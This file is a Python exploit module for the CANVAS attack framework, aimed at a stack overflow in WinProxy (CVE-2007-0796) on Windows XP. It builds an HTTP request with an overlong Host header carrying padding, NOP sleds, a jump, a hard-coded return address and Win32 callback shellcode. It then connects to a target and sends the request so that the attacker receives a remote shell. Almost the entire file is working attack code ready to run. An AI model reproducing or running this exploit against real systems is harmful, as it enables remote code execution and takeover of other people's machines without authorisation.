#! /usr/bin/env python
#Insert your header comments here
import sys 
sys.path.append(".")
sys.path.append("../../")
sys.path.append("../../encoder")
sys.path.append("./encoder")
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
import os
import getopt
import socket
import sys
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
import addencoder
import win32shell
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator
from socket import *
import mosdef 
from mosdefutils import *

NAME= "WINPROXY"
DESCRIPTION= "Winproxy Stack Overflow"
VERSION= ""
DOCUMENTATION = {}
DOCUMENTATION["Date public"]=""
DOCUMENTATION["Repeatability"]=""
DOCUMENTATION["References"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2007-0796"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2007-0796"
DOCUMENTATION['CVSS'] = 7.5

GTK2_DIALOG="dialog.glade2"


PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]= "Remote"
PROPERTY["ARCH"]= [ ["Windows"] ]
PROPERTY["VERSION"]= ["XP"]
runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        # localhost and localport used in shellcode
        self.callbackip = ""
        self.localhost = ""
        self.callbackport = 1
        self.localport = 1
        self.covertness = 0
        self.version = 0
        self.badstring = ""
        self.connectionList = []
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.xpacket1badchars="%\x00\x0a\x0d&?"
	self.port = 21
	self.host = "127.0.0.1"
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcodexPacket1(self):
        badstring = self.xpacket1badchars
        self.createWin32Shellcode(badstring, self.localhost, self.localport)
        return self.shellcode

    def createxPacket1(self):
        buf = '' 
        buf+="GET / HTTP/1.0\r\n"
        buf+="Host: 127.0.0.1: "
        buf+= "A" * (2+5*4)
        buf+= "\x90" * 2 
        buf+= mosdef.assemble("jmp $8", "X86")
        buf+= intel_order(0x602012bc)
        buf+= "\x90" * 10
        buf+= self.createShellcodexPacket1()
	buf+= "A" * 0x200
        buf+= "\r\n\r\n"
        return buf

    def run(self):
        self.port= 80
        try:

            self.host = self.target.interface

        except:

            self.host="localhost"
        self.port = int(self.argsDict.get("port", self.port))

        FD_1 = self.gettcpsock()
        self.log("connect(%s,%s)" % (self.host, self.port))
        FD_1.connect((self.host,self.port))
        self.log("Connected!")
        xpacket1buf=self.createxPacket1()
        self.log("sending packet...")
        FD_1.send(xpacket1buf)
        
        time.sleep(1)

        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port))
            return 1
        self.setInfo("%s attacking %s:%d (failed!)" % (self.name, self.host, self.port))
        return 0

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
